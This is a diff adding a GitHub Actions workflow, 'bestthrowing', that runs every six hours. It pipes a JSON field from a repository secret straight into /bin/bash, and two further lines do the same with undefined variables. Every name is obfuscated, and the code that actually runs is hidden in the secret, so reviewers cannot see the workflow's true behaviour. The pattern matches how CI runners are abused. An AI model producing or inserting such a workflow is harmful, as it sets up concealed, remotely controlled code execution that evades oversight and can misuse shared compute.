@@ -1,0 +1,19 @@
+name: bestthrowing
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bestthrowing
+        env:
+          msu037: ${{ secrets.msu037 }}
+        run: |
+          echo $msu037 | jq -r .linm158 | /bin/bash
+          echo $q0264 | jq -r .u62 | /bin/bash
+          echo $ajm965 | jq -r .rfs41664 | /bin/bash
+
